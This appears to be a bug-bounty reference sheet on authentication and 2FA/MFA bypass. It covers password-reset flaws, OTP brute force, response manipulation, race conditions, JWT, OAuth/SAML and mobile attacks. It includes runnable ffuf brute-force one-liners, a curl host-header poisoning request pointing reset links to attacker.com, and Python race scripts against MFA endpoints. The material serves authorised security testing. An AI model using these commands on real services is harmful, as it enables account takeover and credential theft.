# AUTH BYPASS & 2FA/MFA BYPASS — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (Broken Auth #2, ATO #13, MFA #19, SAML #20), telegram-intel, github-x-intel (H1 reports, BugBountyResources checklists, emadshanab, X tips), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Test password reset flow (token reuse, predictability, host header poisoning)
[ ] 2. Test 2FA/MFA (rate limit, reuse, response manipulation, skip step, race, backup codes)
[ ] 3. Test session management (fixation, replay, "remember device" trust)
[ ] 4. Test auth flow bypass (skip steps, vertical/horizontal privilege escalation)
[ ] 5. Test OAuth/SAML (redirect_uri, state, PKCE, XSW, signature stripping)
[ ] 6. Prove impact: ATO without user interaction = Critical
```

---

## ATO TAXONOMY (9 Paths from bountyforge)

| Path | Description | Typical Bounty |
|------|-------------|----------------|
| **1. Credential Stuffing** | Reused passwords from breaches | Low/Medium |
| **2. Password Reset Flaws** | Token reuse, predictability, host header poisoning | **Critical** |
| **3. 2FA/MFA Bypass** | Rate limit, reuse, response manipulation, skip | **Critical** |
| **4. Session Hijacking** | Fixation, replay, token theft via XSS | High |
| **5. OAuth Account Linking** | Link attacker account to victim email | High |
| **6. IDOR → ATO** | Object ID swap on sensitive endpoint | **Critical** |
| **7. SSRF → ATO** | Internal access → credential theft | **Critical** |
| **8. Race Condition** | Concurrent auth state manipulation | High |
| **9. Client-Side Auth** | UI hides button, API open | Medium |

---

## PASSWORD RESET CHECKLIST (BugBountyResources #1073)

```
[ ] Token in URL → Referer leakage / browser history
[ ] Token not single-use (reuse same token)
[ ] Token not time-limited (no expiry)
[ ] Token predictable / low entropy (sequential, timestamp-based)
[ ] Token leaked in email headers / logs / debug endpoints
[ ] Username enumeration via "account not found" vs "token sent"
[ ] Host header poisoning → password reset link points to attacker
[ ] Race condition: request reset for victim, immediately use token
[ ] Token exposure via "view source" / debug endpoints / API response
[ ] Password reset without current password (for logged-in users)
[ ] Weak password policy on reset (allows common/previous passwords)
[ ] Reset link works cross-domain (no SameSite/Origin check)
[ ] Token in email body vs link (link = Referer leak risk)
[ ] Multiple tokens valid simultaneously
[ ] Token valid after password change
[ ] Token valid after logout
```

### High-Value H1 Reports
| Bounty | Title | Program | Technique |
|--------|-------|---------|-----------|
| **$35,000** | ATO via Password Reset without user interactions | GitLab | Token misuse |
| **—** | 0-Click ATO via Password Reset [AUTH-3243] | Remitly | Token prediction/reuse |
| **—** | ATO in Password Reset Function | Mars | Reset flow bypass |
| **—** | SSRF in Autodesk Rendering → ATO | Autodesk | SSRF chain |
| **—** | Unauthorized Account Access via Leaked Credentials in URL | Khan Academy | URL token leak |

---

## 2FA/MFA BYPASS PATTERNS (7 Core Patterns from web2-vuln-classes #19)

### Pattern 1: No Rate Limit on OTP
```bash
# Test all 1M 6-digit codes
ffuf -u "https://target.com/api/verify-otp" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 -t 5

# Test with distributed requests (avoid 429)
# Test with header manipulation (X-Forwarded-For rotation)
# Test endpoint confusion (/api/verify vs /api/mfa/verify)
```

### Pattern 2: OTP Not Invalidated After Use
```
1. Login → receive OTP "123456" → enter it → success
2. Logout → login again with same credentials
3. Try OTP "123456" again
4. If accepted → OTP never invalidated = ATO (sniff once, reuse forever)
```

### Pattern 3: Response Manipulation
```
1. Enter wrong OTP → capture response in Burp
2. Change {"success":false} → {"success":true} (or 401 → 200)
3. Forward → if app proceeds → client-side only MFA check = Critical
```

### Pattern 4: Skip MFA Step (Workflow Bypass)
```bash
# After password, app sets "pre-mfa" cookie → redirects to /mfa
# Test: skip /mfa entirely, access /dashboard with pre-mfa cookie
curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
# If access granted without MFA = auth flow bypass = Critical
```

### Pattern 5: Race on MFA Verification
```python
import asyncio, aiohttp

async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return r.status, await r.text()

async def race():
    cookies = {"session": "YOUR_SESSION"}
    async with aiohttp.ClientSession(cookies=cookies) as s:
        # Send same OTP simultaneously from two browsers
        results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
        print(results)
asyncio.run(race())
```

### Pattern 6: Backup Code Brute Force
```
- Backup codes: typically 8 alphanumeric = 36^8 = ~2.8T (too large)
- BUT: check if backup codes are only 6-8 digits = 1-10M range = feasible with no rate limit
- Test: can backup codes be reused after exhaustion? Some apps regenerate predictably.
- Test: are backup codes sequential? (000001, 000002...)
```

### Pattern 7: "Remember This Device" Trust Escalation
```
1. Complete MFA once on Device A (attacker's browser)
2. Capture the "remember device" cookie
3. Present that cookie from a new IP/browser
4. If MFA skipped = device trust not bound to IP/UA = ATO from any location
```

---

## 2FA BYPASS CHECKLIST (BugBountyResources #1072)

```
[ ] No rate limit on OTP endpoint
[ ] OTP not invalidated after use (reuse same OTP)
[ ] Response manipulation: change {"success":false} → {"success":true}
[ ] Skip MFA step entirely: access /dashboard with pre-MFA cookie
[ ] Race condition on MFA verification (same OTP from 2 sessions)
[ ] Backup code brute force (6-8 digit codes = feasible)
[ ] "Remember device" cookie not bound to IP/UA
[ ] OTP delivered via insecure channel (email without TLS, SMS SS7)
[ ] OTP in URL params / Referer header
[ ] TOTP secret exposed in QR code / API response
[ ] MFA enrollment flow bypass (add new device without MFA)
[ ] Recovery code enumeration / reuse
[ ] Push notification approval without user interaction
[ ] WebAuthn/FIDO2 bypass (replay, downgrade)
[ ] SMS OTP intercept (SS7, SIM swap not required if no rate limit)
[ ] Email OTP intercept (IMAP/POP3 access, forwarding rules)
[ ] TOTP time sync issues (clock drift acceptance window)
[ ] Multiple 2FA methods - test weakest one
```

---

## AUTH FLOW BYPASS (Broken Access Control + Auth)

### Vertical Privilege Escalation (Admin Endpoints)
```bash
# Sibling Rule: if /admin/users has auth, check /admin/export, /admin/delete, /admin/reset
for endpoint in export delete reset debug config backup logs; do
  curl -H "Auth: USER_TOKEN" "https://target.com/admin/$endpoint" -w "$endpoint: %{http_code}\n"
done
```

### Client-Side Only Checks
```javascript
// UI hides button, but API endpoint exists
if (user.role === 'admin') showAdminButton();
// Backend: app.post('/api/admin/delete', deleteUser); // NO SERVER CHECK!
```

### Session Fixation
```
1. Attacker gets valid session ID (unauthenticated)
2. Attacker forces victim to use that session ID (link, MITM)
3. Victim logs in → session now authenticated as victim
4. Attacker uses same session ID → logged in as victim
```

### JWT Attacks
```bash
# Algorithm confusion (RS256 → HS256)
# None algorithm
# Key confusion (public key as HMAC secret)
# Kid header injection
# Exp claim manipulation
# Weak secret brute force (jwt_tool, hashcat)
```

### OAuth/SAML Specific
```
OAuth:
[ ] Missing PKCE (Coinbase pattern) - no code_challenge required
[ ] State parameter missing/predictable (CSRF on OAuth)
[ ] Redirect_uri validation bypass (11 techniques - see OAuth section)
[ ] Access token reuse across clients
[ ] Implicit flow token in fragment (leak via Referer)

SAML:
[ ] XML Signature Wrapping (XSW) - inject evil assertion
[ ] Signature stripping - remove signature, modify assertion
[ ] Comment injection - XML comments break signature validation
[ ] Replay attack - capture and replay SAML response
[ ] IDP-initiated SSO without InResponseTo validation
```

---

## HIGH-VALUE H1 REPORTS (2025)

| Bounty | Title | Program | Technique |
|--------|-------|---------|-----------|
| **$35,000** | ATO via Password Reset without user interactions | GitLab | Reset token misuse |
| **—** | 0-Click ATO via Password Reset [AUTH-3243] | Remitly | 0-click |
| **—** | ATO in Password Reset Function | Mars | Reset flow |
| **—** | 2FA Bypass leads to impersonation | Drugs.com | Forced browsing |
| **—** | 2FA bypass possible on authsvc.singlestore.com | SingleStore | 2FA bypass |
| **—** | 2FA bypass possible on WakaTime OAuth | WakaTime | OAuth flow |
| **—** | Authentication Bypass in Subscription Management | lemlist | Auth bypass |
| **—** | Authentication Token Theft via Open Redirect | lemlist | Open redirect chain |
| **—** | Unauthorized Password Reset Allows ATO Across Tenant | lemlist | Multi-tenant |
| **—** | Session Replay Attack Allows Auth Bypass | WakaTime | Session replay |

---

## CHAINS THAT PAY

```
Password Reset token reuse + no rate limit          → Critical (0-click ATO)
2FA rate limit bypass + OTP reuse                   → Critical (ATO)
2FA response manipulation (client-side check)       → Critical (ATO)
Skip MFA step (pre-mfa cookie → dashboard)          → Critical (Auth flow bypass)
Race condition on MFA + no lockout                  → Critical (ATO)
"Remember device" cookie not bound to IP/UA         → Critical (ATO from anywhere)
IDOR on password reset token + prediction           → Critical (ATO)
OAuth redirect_uri bypass → account linking         → Critical (ATO)
SSRF → internal creds → ATO                         → Critical
Session fixation + auth bypass                      → Critical
Race condition on auth state (folder creation)      → High
Client-side only admin check + critical action      → Critical
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# Password reset token brute force (if numeric)
ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -mc 200

# Host header poisoning on reset
curl -H "Host: attacker.com" "https://target.com/forgot-password" -d "email=victim@target.com"

# 2FA rate limit test
ffuf -u "https://target.com/api/verify-otp" -X POST -H "Content-Type: application/json" -d '{"otp":"FUZZ"}' -w <(seq -w 000000 999999) -fc 400,429

# Pre-MFA cookie test
curl -b "pre_mfa=SESSION" "https://target.com/dashboard" -s -o /dev/null -w "%{http_code}"

# JWT algorithm confusion
jwt_tool -t "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..." -X k -pk public.pem

# OAuth redirect_uri bypass
# Test all 11 techniques from OAuth section
```

---

## RACE CONDITIONS ON AUTH (From web2-vuln-classes #6, H1 Reports)

### Target Endpoints
- Password reset request + token use
- 2FA verification (same OTP, 2 sessions)
- Folder/workspace creation (Dust, SingleStore)
- Account creation (Lichess)
- OAuth code exchange
- Email change confirmation

### Testing
```python
import asyncio, aiohttp

async def race_endpoint(session, payload):
    async with session.post("https://target.com/api/endpoint", json=payload) as r:
        return r.status, await r.text()

async def main():
    async with aiohttp.ClientSession() as s:
        # 20-50 concurrent requests
        tasks = [race_endpoint(s, {"otp": "123456"}) for _ in range(30)]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)
asyncio.run(main())
```

---

## MOBILE AUTH BYPASS (From pentestandroid, telegram-intel)

### Android/iOS Specific
```
[ ] Biometric bypass (root detection, emulator detection)
[ ] Certificate pinning bypass → MITM auth traffic
[ ] Deep link / intent hijack → token theft
[ ] WebView JavaScript bridge → credential access
[ ] Local storage / SharedPreferences / Keychain extraction
[ ] Backup extraction (adb backup, iTunes backup)
[ ] Frida hooking auth methods (bypass root checks, SSL pinning)
[ ] Objection (automated Frida) - `objection -g com.app explore` → `sslpinning disable`
```

---

## TRIAGE DECISION TREE

```
1. Can attacker achieve ATO WITHOUT victim interaction?
   YES → Critical (0-click ATO)
   NO → Continue

2. Can attacker achieve ATO with ONE victim interaction (click, open email)?
   YES → High/Critical
   NO → Continue

3. What auth factor is bypassed?
   - Password only (reset, brute, credential stuffing)    → High
   - 2FA/MFA (OTP, push, WebAuthn, backup codes)         → Critical
   - Session (fixation, hijack, replay)                  → High
   - OAuth/SAML (redirect, state, PKCE, XSW)             → Critical

4. Chain potential?
   + IDOR on reset token                                 → Critical
   + SSRF → internal creds                               → Critical
   + XSS → session theft                                 → Critical
   + Race condition on auth state                        → High/Critical
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| Credential stuffing (no target-specific flaw) | Not a target bug |
| Phishing required (no technical bypass) | Social engineering = N/A |
| 2FA bypass requires MITM (no crypto break) | Not a vuln = N/A |
| "Weak" password policy (no breach) | Policy issue = Low/Info |
| Username enumeration alone | Info disclosure = Low |
| Rate limit exists but "could be bypassed if..." | Theoretical = N/A |
| OTP in SMS/email (standard delivery) | Not a bug = N/A |
| Backup codes exist but not brute-forced | Not demonstrated = N/A |
| "Remember device" works as designed | Feature = N/A |
| Auth bypass on non-sensitive endpoint | Low/Info |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `ffuf` | Rate limit testing, token brute force |
| `aiohttp`/`asyncio` | Race condition testing |
| `jwt_tool` | JWT algorithm confusion, key confusion |
| `oauth-tools` | OAuth PKCE, state, redirect_uri testing |
| `saml-raider` (Burp) | SAML XSW, signature stripping |
| `Burp Suite` | Response manipulation, session handling |
| `Param Miner` (Burp) | Host header poisoning, unkeyed headers |
| `race-the-web` | HTTP race condition testing |
| `nuclei` templates | Auth bypass, 2FA, reset templates |
| `objection` / `Frida` | Mobile auth bypass, SSL pinning |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Sections 2 (Broken Auth), 13 (ATO), 19 (MFA), 20 (SAML)
- telegram-intel: @bugbountyresources 2FA Bypass.pdf, Reset Password.pdf; @Bug0x rate limit→ATO, Chrome behavior→ATO
- github-x-intel: H1 reports (GitLab $35k, Remitly, Mars, Autodesk, Drugs.com, SingleStore, WakaTime, lemlist); BugBountyResources checklists; bountyforge ATO taxonomy
- bountyforge: ATO chains (9 paths), 7-Question Gate
- bb-methodology: Multi-Perspective (vertical/horizontal), What-If experiments
- PortSwigger: Auth bypass labs, OAuth labs, SAML labs
- HackTricks: Authentication bypass, 2FA bypass
- OWASP: Authentication Cheat Sheet, MFA Cheat Sheet